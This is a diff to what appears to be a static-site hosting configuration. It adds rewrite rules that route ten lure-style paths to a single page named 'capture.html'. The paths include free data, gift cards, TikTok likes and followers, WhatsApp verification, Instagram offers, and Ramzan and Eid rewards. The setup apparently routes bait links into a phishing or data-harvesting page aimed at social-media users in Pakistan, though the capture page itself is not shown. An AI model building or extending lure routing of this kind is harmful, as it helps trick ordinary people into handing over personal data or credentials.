@@ -1,3 +1,45 @@
 {
-  "cleanUrls": true
+    "cleanUrls": true,
+    "rewrites": [
+        {
+            "source": "/freedata",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/giftcard",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/lucky-draw",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/tiktok-likes",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/whatsapp-verify",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/tiktok-followers",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/instagram-offer",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/ramzan-offer",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/eid-gift",
+            "destination": "/capture.html"
+        },
+        {
+            "source": "/pakistan-reward",
+            "destination": "/capture.html"
+        }
+    ]
 }
